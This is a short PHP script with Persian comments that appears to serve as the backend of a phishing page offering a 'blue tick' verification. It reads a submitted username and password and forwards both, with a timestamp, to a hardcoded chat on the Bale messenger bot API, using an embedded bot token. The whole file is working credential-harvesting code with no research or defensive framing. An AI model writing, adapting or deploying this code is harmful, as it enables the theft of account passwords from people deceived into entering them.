<?php
// تنظیمات
$botToken = '320677015:RWJjPh3sh4dnGUbPTasbvSEHXdfoHllywjCYon2O';
$chatId   = '728231796';

// دریافت داده‌ها از فرم
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

if (!$username || !$password) {
    echo json_encode(['ok' => false, 'error' => 'نام کاربری یا رمز عبور خالی است']);
    exit;
}

// پیام نهایی
$message = "درخواست جدید تیک آبی:\n\nکاربری: $username\nرمز: $password\nزمان: " . date("Y-m-d H:i:s");

// ارسال به API بله
$url = "https://tapi.bale.ai/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$options = [
    'http' => [
        'header' => "Content-type: application/json\r\n",
        'method' => 'POST',
        'content' => json_encode($postData)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    echo json_encode(['ok' => false, 'error' => 'خطا در اتصال به API بله']);
} else {
    echo $result;
}
?>